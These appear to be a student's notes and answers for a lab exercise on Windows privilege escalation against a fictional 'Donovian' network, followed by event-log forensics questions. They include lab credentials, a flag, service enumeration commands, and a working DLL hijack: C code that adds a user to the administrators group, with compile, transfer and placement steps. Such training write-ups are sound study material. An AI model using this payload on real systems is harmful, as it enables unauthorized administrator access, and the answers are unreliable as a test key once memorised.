Donovian Windows Privilege Escalation (DWP)
XX Jan 2027
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyberspace Exploitation (C-E)

Objective: Maneuver into the Donovian internal network, gain privileged access to discovered Windows host.

Tools/Techniques: SSH and RDP masquerade into internal network with provided credentials. Ports in use will be dependent on target location and are subject to change. Windows techniques to gain privileged access such as DLL hijack, UAC bypass through weak paths, permissions, and tasks. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = 3@SYw1nd0w55t@rt0F@ct1v1ty

Prior Approvals: DLL hijack and UAC bypass, restarting of services through host reboot. Host survey utilizing native command shells, which shell is at discretion of student.

Scheme of Maneuver:
>Jump Box
->Pivot: 192.168.28.105
-->T1: 192.168.28.5

Target Section:

Pivot
Hostname: ftp.site.donovia
IP: 192.168.28.105
OS: Ubuntu 18.04
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222
Malware: none
Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.

T1
Hostname: donovian-windows-private
IP: 192.168.28.5
OS: Windows ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: 3389
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.

## Exercise
### vuln 1
Analyze the System and identify the means to escalate your privileges. Report the "status" of your finding by entering the correct Display Name.
- xfreerdp /v:127.0.0.1:1111 /u:comrade /p:StudentPrivPassword /size:1920x1024 +clipboard
- Scheduled Tasks
- get-wmiobject win32_service | where-object {$_.pathname -notlike "c:\windows\*"} | select-object -property name,displayname,pathname
  - Services
    - sort by description (if blank, look into)
- sc.exe qc MemoryStatus
- MemoryStatus.exe

### vuln 2
What Account will it utilize at Log on?
- Services
  - 'Log in As' 'Local System'
- sc.exe qc MemoryStatus

### escalation type
What type of escalation can you perform with your findings?
- DLL Hijacking

### DLLs  
What is the name of the DLL that is supposed to be loaded, by the vulnerable service?
- get-content c:\memorystatus\service.c
  -  hinstLib = LoadLibrary(TEXT("hijackmeplz.dll"));

### code
Sample code below has been provided by our dev shop, they have been testing it; however, it appears to not function and they request your help to get it to function.
` C
#include 
int happyfunction(char * test)
{
 WinExec();
 return ;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 happyfunction("");
 return 0;`
Correct the code in order to escalate your privileges. What you seek is waiting on the Admin's Desktop.

`#include <windows.h>
int execCommand()
{
 WinExec("cmd /C net localgroup administrators comrade /add",1);
 return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 execCommand();
 return 0;
}`

- i686-w64-mingw32-g++ -c bad.c -o bad.o
- i686-w64-mingw32-g++ -shared -o bad.dll bad.o -Wl,--out-implib,bad.a
- python -m SimpleHTTPServer 8000
- grab file from target
- rename to vulnerable dll and place in dll location
- get-childitem -recurse hijackmeplz.dll | format-table directory,creationtime,lastwritetime
- copy .\Downloads\hijackmeplz.dll c:\MemoryStatus\
restart device
- net user comrade


### windows event log 1
What service is causing a error level log for 31 May between 1200-1330 hrs. System log file is located under comrade's directory.

- search time and look under "General" tab
- Fortnite MMM service

### windows event log 2
Using the same "system.evtx" log, what was the date the offending service was first created? Provide answer in the following format: YYYY-MM-DD

- filter log by error event ids 7000,7009
- 2019-05-31

### windows event log 3
Using the same "system.evtx" log, is this a legitimate Windows service? To correctly answer the question enter Y or N.

- Not a legitimate service, falls under the epic service

### windows event log 4
Using the same "system.evtx" log, The system time has changed, what is the new year?

- look at date and time
- 2230
